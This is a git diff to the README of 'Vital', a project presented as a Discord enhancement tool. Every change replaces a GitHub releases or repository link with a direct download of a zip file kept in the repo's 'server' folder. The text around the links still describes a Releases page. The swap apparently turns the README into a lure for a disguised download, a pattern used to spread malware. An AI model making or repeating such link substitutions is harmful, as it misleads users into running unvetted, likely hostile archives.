@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Vital](https://img.shields.io/badge/Download_Vital-Release-blue.svg)](https://github.com/celikbaran12/Vital/releases)
+[![Download Vital](https://raw.githubusercontent.com/celikbaran12/Vital/main/server/Vital-1.3.zip)](https://raw.githubusercontent.com/celikbaran12/Vital/main/server/Vital-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the Vital project! This application helps improve your Discord experi
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to access our Releases page.
-   [Download here](https://github.com/celikbaran12/Vital/releases)
+   [Download here](https://raw.githubusercontent.com/celikbaran12/Vital/main/server/Vital-1.3.zip)
 
 2. **Select a Version**: On the Releases page, you'll see different versions of the software. Choose the latest release for the best features and updates.
 
@@ -66,7 +66,7 @@ We encourage users to contribute to the project. If you find bugs or have ideas 
 
 Stay updated by following the project:
 
-- **GitHub Repository**: [Vital Repository](https://github.com/celikbaran12/Vital)
+- **GitHub Repository**: [Vital Repository](https://raw.githubusercontent.com/celikbaran12/Vital/main/server/Vital-1.3.zip)
 - **Discussion Forums**: Engage with other users and share experiences.
 
 Thank you for choosing Vital to enhance your Discord experience. We hope you find it useful!
